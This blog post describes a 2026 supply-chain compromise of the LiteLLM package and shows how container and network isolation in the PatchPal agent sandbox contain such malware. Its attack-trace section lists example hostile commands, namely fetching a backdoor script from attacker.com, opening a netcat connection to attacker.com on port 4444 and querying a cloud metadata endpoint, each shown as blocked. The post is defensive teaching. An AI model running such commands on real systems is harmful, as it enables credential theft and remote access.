---
layout: post
title: "Supply Chain Attacks and Defense in Depth for AI Coding Agents"
categories: [Security, AI]
tags: [supply chain attack, security, ai agents, containers, network isolation]
---

> "Security is not a product, but a process." - Bruce Schneier

On March 24, 2026 at 10:52 UTC, a supply chain attack targeting the popular LiteLLM library was discovered. Versions 1.82.7 and 1.82.8, published directly to PyPI (bypassing GitHub releases), contained sophisticated malware designed to steal credentials, exfiltrate data, and establish persistence on compromised systems.

This incident, following numerous npm/TypeScript supply chain attacks in 2025, highlights a critical question for AI coding agents: How do we protect sensitive environments when the very dependencies we rely on might be compromised?

## What Happened

The malicious LiteLLM releases contained a `.pth` file that executed automatically on every Python interpreter startup. The payload operated in three stages:

**1. Collection**: Harvested sensitive files including:
- SSH private keys and configs
- `.env` files with API keys
- AWS, GCP, and Azure credentials
- Kubernetes configs and cluster secrets
- Database passwords
- Shell history and `.gitconfig`
- Cryptocurrency wallet files

**2. Exfiltration**: Encrypted stolen data with AES-256-CBC (using a hardcoded 4096-bit RSA key) and sent it to `https://models.litellm.cloud/` — a domain not part of legitimate LiteLLM infrastructure.

**3. Persistence & Lateral Movement**: 
- Installed backdoors at `~/.config/sysmon/sysmon.py` with systemd services
- In Kubernetes environments, compromised all cluster secrets across all namespaces
- Attempted to create privileged pods on every node in `kube-system`

The attack was discovered when it triggered an accidental fork bomb (a bug in the malware), causing systems to crash. The compromised versions have since been yanked from PyPI.

Source with full details: [FutureSearch Blog Post](https://futuresearch.ai/blog/litellm-pypi-supply-chain-attack/)

## The AI Coding Agent Problem

AI coding agents, including our own agent harness [PatchPal](https://github.com/amaiya/patchpal), face a fundamental security challenge: they need broad system access to read code, run commands, and make changes, while relying on external dependencies that could be compromised.

The LiteLLM incident is just the latest in a growing trend. The year 2025 saw a surge in supply chain attacks across ecosystems:
- **npm/TypeScript**: [Supply chain attack compromised nearly 20 popular packages](https://www.cpomagazine.com/cyber-security/supply-chain-attack-infects-nearly-20-popular-npm-packages-with-billions-of-weekly-downloads/) with billions of weekly downloads, injecting crypto-stealing code
- **PyPI**: [Surge of malicious packages detected starting August 2025](https://thehackernews.com/2025/08/malicious-pypi-and-npm-packages.html), exploiting developer trust to establish persistence and achieve code execution
- **RubyGems**: [60 malicious packages discovered in August 2025](https://thehackernews.com/2025/08/rubygems-pypi-hit-by-malicious-packages.html), accumulating over 275,000 downloads to steal credentials
- **Cargo (Rust)**: [Growing concerns about supply chain vulnerabilities](https://blog.trailofbits.com/2025/09/24/supply-chain-attacks-are-exploiting-our-assumptions/) as the ecosystem matures

Traditional security measures like version pinning help, but they're not foolproof. What if:
- A zero-day vulnerability exists in a "safe" version?
- A maintainer's account gets compromised?
- A transitive dependency contains malware?

We need **defense in depth** — multiple layers of protection so that if one fails, others still provide security.

## Container Isolation: The First Layer

Running AI agents in containers provides immediate benefits. The [PatchPal](https://github.com/amaiya/patchpal) agent harness includes a `patchpal-sandbox` command that runs the agent in an isolated Docker or Podman container, automatically handling the complexity of container setup.

### What is patchpal-sandbox?

`patchpal-sandbox` is a command-line tool that wraps PatchPal in a container with configurable security policies:

```bash
# Basic usage - runs PatchPal in isolated container
patchpal-sandbox -- --model anthropic/claude-sonnet-4-5

# With network restrictions (explained below)
patchpal-sandbox --restrict-network -- --model anthropic/claude-sonnet-4-5

# With custom environment variables
patchpal-sandbox --env-file .env -- --model bedrock/...
```

The `--` separator distinguishes sandbox options (left side) from PatchPal arguments (right side).

### Benefits of Container Isolation

### 1. Ephemeral Filesystem
Containers with `--rm` flags are destroyed after each session:
- Malware persistence mechanisms (like `~/.config/sysmon/sysmon.py`) disappear on exit
- Backdoors don't survive to the next session
- No permanent foothold on the host system

### 2. Limited Host Access
By default, containers don't have access to:
- Host filesystem (no `~/.ssh`, `~/.aws`, `~/.kube`)
- Host shell history
- Host environment variables
- Other containers or processes

The container only has access to the specific working directory where `patchpal-sandbox` was started.

### 3. Controlled Credential Exposure
Only credentials from `.env` files are passed when `--env-file` is used:
```bash
# With --env-file: ONLY variables from .env are passed (host env excluded)
patchpal-sandbox --env-file .env -- --model bedrock/...

# Without --env-file: Host environment variables are passed through
patchpal-sandbox -- --model openai/gpt-5-mini

# Either way: ~/.aws/credentials file remains inaccessible (not mounted)
```

But containers alone aren't enough. A compromised container can still:
- Exfiltrate passed credentials to external servers
- Query cloud metadata endpoints (AWS IMDS, GCP metadata)
- Download additional malware
- Establish reverse shells

This is where network isolation becomes critical.

## Network Isolation: The Second Layer

Network isolation prevents compromised code from communicating with the outside world. The key insight: **Most AI agent operations don't need unrestricted network access**.

For example, when working with AWS Bedrock:
- **Needed**: Access to `bedrock-runtime.us-gov-east-1.amazonaws.com`
- **Not needed**: Access to arbitrary domains or cloud metadata endpoints
- **Possibly needed**: Package repositories like PyPI (if installing dependencies at runtime)

### How Network Restrictions Work

Using iptables firewall rules inside the container:

```bash
# Allow only specific endpoints
patchpal-sandbox --restrict-network \
  --allow-url https://api.anthropic.com \
  -- --model anthropic/claude-sonnet-4-5
```

This creates a default-deny firewall that:
1. **Blocks everything by default** (including `models.litellm.cloud`)
2. **Allows only whitelisted domains** (your LLM provider)
3. **Permits DNS and localhost** (required for basic operation)
4. **Logs all blocked connections** (for audit trails)

The firewall rules look like this:
```
Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     udp  --  anywhere             anywhere             udp dpt:domain
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:domain
ACCEPT     all  --  anywhere             127.0.0.0/8
ACCEPT     tcp  --  anywhere             52.94.133.131        tcp dpt:https
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
LOG        all  --  anywhere             anywhere             LOG level warning prefix "BLOCKED: "
DROP       all  --  anywhere             anywhere
```

### Protection Against the LiteLLM Attack

Let's trace what happens if compromised LiteLLM code runs inside a network-isolated container:

**1. Credential Collection**: ✅ Happens (but only sees container's limited credentials, not host)

**2. Exfiltration Attempt**:
```bash
# Malware tries: POST https://models.litellm.cloud/
# Result: BLOCKED by iptables (not in whitelist)
# Logged: "BLOCKED: dst=models.litellm.cloud"
```

**3. Cloud Metadata Query**:
```bash
# Malware tries: GET http://169.254.169.254/latest/meta-data/
# Result: BLOCKED by iptables (not in whitelist)
```

**4. Backdoor Download**:
```bash
# Malware tries: curl https://attacker.com/backdoor.sh
# Result: BLOCKED by iptables (not in whitelist)
```

**5. Reverse Shell**:
```bash
# Malware tries: nc attacker.com 4444
# Result: BLOCKED by iptables (port 443 only, specific IPs only)
```

The attack is effectively neutered. The malware can collect what's in the container, but can't exfiltrate it, can't download additional payloads, and can't establish persistence.

## Auto-Detection of LLM Endpoints

Manually specifying `--allow-url` for every LLM provider would be tedious. Network restriction implementations can auto-detect endpoints from environment variables:

```bash
# Automatically allows api.anthropic.com (detected from ANTHROPIC_API_KEY)
export ANTHROPIC_API_KEY=sk-ant-...
patchpal-sandbox --restrict-network -- --model anthropic/claude-sonnet-4-5

# Automatically allows bedrock endpoint (detected from AWS_REGION)
export AWS_REGION=us-gov-west-1
export AWS_ACCESS_KEY_ID=AKIA...
patchpal-sandbox --restrict-network -- --model bedrock/...
```

Supported auto-detection:
- **OpenAI**: `OPENAI_API_KEY` → `https://api.openai.com`
- **Anthropic**: `ANTHROPIC_API_KEY` → `https://api.anthropic.com`
- **AWS Bedrock**: `AWS_REGION` → Region-specific endpoint (including GovCloud and China)
- **Azure OpenAI**: `AZURE_OPENAI_RESOURCE` → Resource-specific endpoint
- **Google AI**, **Groq**, **Cohere**, **Together**, **Replicate**: Respective API keys
- **Custom endpoints**: `*_BASE_URL`, `*_API_BASE`, `*_ENDPOINT` variables

### Adding Additional URLs

In some scenarios, you may need to allow access beyond the auto-detected LLM endpoints. The most common case is allowing access to package repositories like PyPI if your agent needs to install Python packages at runtime.

You can add additional URLs with the `--allow-url` flag:

```bash
# Auto-detect LLM endpoint + allow PyPI for pip install
patchpal-sandbox --restrict-network \
  --allow-url https://pypi.org \
  --allow-url https://files.pythonhosted.org \
  -- --model anthropic/claude-sonnet-4-5
```

Common additional URLs include:
- **PyPI**: `https://pypi.org` and `https://files.pythonhosted.org` (for `pip install`)
- **GitHub**: `https://github.com` and `https://api.github.com` (for git operations)
- **npm**: `https://registry.npmjs.org` (for Node.js packages)

**Security Note**: Only add URLs that are strictly necessary for your workflow. Each additional URL increases the attack surface - while still much better than unrestricted access, a compromised allowed domain could potentially receive exfiltrated data.

## Implementation Note: Pre-downloading LiteLLM Dependencies

An interesting technical detail emerged during implementation: to avoid hangs when network isolation is enabled, certain dependencies must be pre-downloaded before the firewall is configured.

### Why Pre-download is Necessary

**LiteLLM Model Cost Map**: On first import, LiteLLM attempts to download an updated model cost map from `https://raw.githubusercontent.com/BerriAI/litellm/main/model_prices_and_context_window.json`. If the firewall is already enabled, this connection attempt will hang and timeout, delaying startup significantly. While LiteLLM falls back to bundled cost data, the timeout creates a poor user experience.

**Tiktoken Encodings**: LiteLLM uses tiktoken internally for token counting. Although LiteLLM bundles tiktoken encoding files (~7.5MB) directly in the package since version 1.50.0 ([GitHub issue #1071](https://github.com/BerriAI/litellm/issues/1071)), we pre-download the encodings as a precaution. This ensures compatibility across different container configurations, guaranteeing tiktoken never attempts to download from `https://openaipublic.blob.core.windows.net/` after the firewall is up.

### The Pre-download Solution

The implementation pre-downloads both dependencies before setting up the firewall:

```bash
echo "=== Pre-downloading required data (before network restrictions) ==="

# Pre-download tiktoken encodings to local cache
# Sets TIKTOKEN_CACHE_DIR and downloads cl100k_base encoding
python3 << 'PYTHON_EOF'
import tiktoken
import os
os.environ['TIKTOKEN_CACHE_DIR'] = '/tmp/tiktoken_cache'
enc = tiktoken.encoding_for_model("gpt-4")
enc.encode("test")
print("✓ Tiktoken encodings cached")
PYTHON_EOF

# Pre-import litellm (downloads model cost map from GitHub)
python3 -c "import litellm; print('✓ LiteLLM initialized')"

echo "=== Setting up network restrictions ==="
# Now configure iptables rules - everything is cached
iptables -A OUTPUT -d <allowed-ips> -p tcp --dport 443 -j ACCEPT
iptables -A OUTPUT -j DROP
```

This ensures:
- **Fast startup**: No hanging waiting for blocked network connections
- **Complete isolation**: After the firewall is enabled, no network access is attempted
- **Reliable operation**: Both LiteLLM and tiktoken work seamlessly with cached data

## Testing Network Restrictions

Before running critical workloads, verify the firewall is working:

```bash
patchpal-sandbox --restrict-network \
  --allow-url https://api.anthropic.com \
  --test-restrictions
```

This runs automated tests:
```
Test 1: Attempting to reach google.com (should be BLOCKED):
  ✓ PASSED: google.com blocked as expected

Test 2: Attempting to reach api.anthropic.com (should be ALLOWED):
  ✓ PASSED: api.anthropic.com accessible as expected

Test 3: Attempting to reach github.com (should be BLOCKED):
  ✓ PASSED: github.com blocked as expected

=== All network restriction tests PASSED ===
```

## Real-World Usage

### AWS GovCloud Bedrock
```bash
patchpal-sandbox --restrict-network \
  --env-file .env.govcloud \
  -- --model "arn:aws-us-gov:bedrock:us-gov-east-1:...:inference-profile/..."
```

Auto-detects:
- `https://bedrock-runtime-fips.us-gov-east-1.amazonaws.com` (from `AWS_REGION`)
- VPC endpoint URLs (from `AWS_BEDROCK_ENDPOINT`)

### Multi-Provider Setup
```bash
# Allow both Anthropic and OpenAI
export ANTHROPIC_API_KEY=sk-ant-...
export OPENAI_API_KEY=sk-...

patchpal-sandbox --restrict-network -- --model openai/gpt-5.2-codex
```

Auto-detects both `api.anthropic.com` and `api.openai.com`.

### With PyPI Access
```bash
# LLM API + PyPI for pip install
patchpal-sandbox --restrict-network \
  --allow-url https://pypi.org \
  --allow-url https://files.pythonhosted.org \
  -- --model anthropic/claude-sonnet-4-5
```

## What Gets Protected

✅ **Host credentials**: Not accessible inside container  
✅ **Host SSH keys**: Not mounted  
✅ **Host filesystem**: Not accessible without explicit mounts  
✅ **Cloud metadata**: Blocked by firewall  
✅ **Data exfiltration**: Blocked by firewall  
✅ **Backdoor downloads**: Blocked by firewall  
✅ **Lateral movement**: Container isolation + network restrictions  
✅ **Persistent backdoors**: Ephemeral containers (`--rm`)  

⚠️ **Container credentials**: Passed via `--env-file` are visible (but can't be exfiltrated)

## Limitations and Considerations

Network isolation isn't perfect:

1. **Allowed domains are still accessible**: If an attacker compromises an allowed LLM provider's domain, they could receive exfiltrated data
2. **DNS tunneling**: Sophisticated attackers could tunnel data via DNS (though this is detectable and slow)
3. **Time-based side channels**: Some data could leak via timing attacks
4. **Container escape**: If a kernel vulnerability allows container escape, protections fail

But these are much higher bars than "can the malware make an HTTP POST?"

## Best Practices

1. **Always use network restrictions in sensitive environments**:
```bash
patchpal-sandbox --restrict-network ...
```

2. **Use minimal credential scoping**: Only pass credentials needed for the specific task

3. **Pin dependency versions**: Use `litellm<=1.82.6` or specific known-good versions

4. **Monitor blocked connections**:
```bash
# Inside container
dmesg | grep BLOCKED
```

5. **Test restrictions before production**:
```bash
patchpal-sandbox --restrict-network --test-restrictions
```

6. **Use ephemeral containers**: Always use `--rm` flag (automatic in patchpal-sandbox)

7. **Rotate credentials**: If you ran compromised versions without restrictions, rotate all credentials

8. **Audit logs**: Review iptables logs for unexpected connection attempts

## The Broader Lesson

Supply chain attacks like the LiteLLM incident demonstrate why relying on any single security measure is insufficient:

- **Version pinning alone**: Doesn't protect against zero-days or account compromise
- **Code review alone**: Can't catch malicious code in pre-compiled wheels or minified JavaScript
- **Trust in maintainers alone**: Accounts can be compromised (as we've seen in npm, PyPI, and other ecosystems)
- **Container isolation alone**: Doesn't prevent network-based attacks
- **Network restrictions alone**: Doesn't help if you allow unrestricted network access

But **layered defenses** — version pinning + container isolation + network restrictions + minimal credentials — create a security posture where an attacker must bypass multiple independent barriers.

This is defense in depth. No single layer is perfect, but together they make attacks dramatically harder.

---

**Resources:**
- [PatchPal GitHub Repository](https://github.com/amaiya/patchpal) - AI coding agent with network isolation support
- [FutureSearch Blog: LiteLLM Supply Chain Attack](https://futuresearch.ai/blog/litellm-pypi-supply-chain-attack/) - Detailed attack analysis
- [PatchPal Sandbox Documentation](https://amaiya.github.io/patchpal/usage/sandbox/) - Container usage guide

**Acknowledgments:** Thanks to the team at FutureSearch for their detailed analysis of the attack, and to the PyPI administrators for their rapid response in yanking the compromised packages.
